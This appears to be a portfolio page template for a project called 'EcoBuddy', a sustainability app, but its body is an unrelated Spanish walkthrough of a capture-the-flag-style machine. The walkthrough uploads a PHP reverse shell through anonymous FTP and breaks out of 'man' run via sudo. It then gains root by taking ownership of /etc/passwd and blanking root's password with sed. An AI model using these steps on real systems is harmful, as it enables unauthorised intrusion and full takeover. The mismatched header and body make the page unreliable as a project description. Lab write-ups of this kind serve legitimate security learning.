---
title: 'Proyecto 1'
description: EcoBuddy is a mobile app that gamifies sustainable living. Users can set eco-friendly goals, track their carbon footprint, and earn virtual rewards for adopting environmentally conscious habits.
publishDate: 'Jan 02 2024'
isFeatured: true
seo:
  image:
    src: '/project-1.jpg'
    alt: Project preview
---

![Wavy lines](/post-14.jpg)



> Web frameworks are the architectural blueprints that empower developers to build the digital landscapes of tomorrow.



Entramos por ftp con usuario anonymous.
Nos conectamos desde el directorio Downloads en nuestra maquina atacante al host victima por ftp y subimos una reverse shell con ftp 

```
put  php-reverse-shell2.php
```

Ya adentro revisamos los usuarios con:
```
cat /etc/passwd | grep sh$
```

Revisamos los permiso que tenemos:



Con el comando sudo -u pingu man man abrimos un binario y ponemos !/bin/bash



Ahora somo el usuario pingu, repetimos el proceso:



Para escalar lo que tenemos que hacer es cambiar el propietario de /etc/passwd de la siguente manera:

`sudo /usr/bin/chown $(id -un):$(id -gn) /etc/passwd`

Luego con sed hacemos que elimine la X que tiene root para que la contraseña desaparezca y creamos un archivo temporal en tmp.

`sed 's/^root:[^:]*:/root::/' /etc/passwd > /tmp/passwd.tmp`

Para finalizar copiamos el tmp donde esta el original para que lo sobreescriba

`cp /tmp/passwd.tmp /etc/passwd`



Ahora hacemos un su ROOT y accederemos al usuario ROOT sin proporcionar contraseña

